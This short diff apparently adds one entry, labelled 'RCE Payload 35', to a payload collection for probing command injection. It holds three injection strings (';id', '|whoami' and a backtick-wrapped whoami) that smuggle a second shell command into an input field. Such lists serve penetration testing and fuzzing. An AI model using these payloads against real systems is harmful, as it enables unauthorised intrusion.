@@ -1,0 +1,6 @@
+-e # RCE Payload 35
+# Version: 1.0.15-20260301-Minggu-1621-WIB
+
+;id
+|whoami
+`whoami`
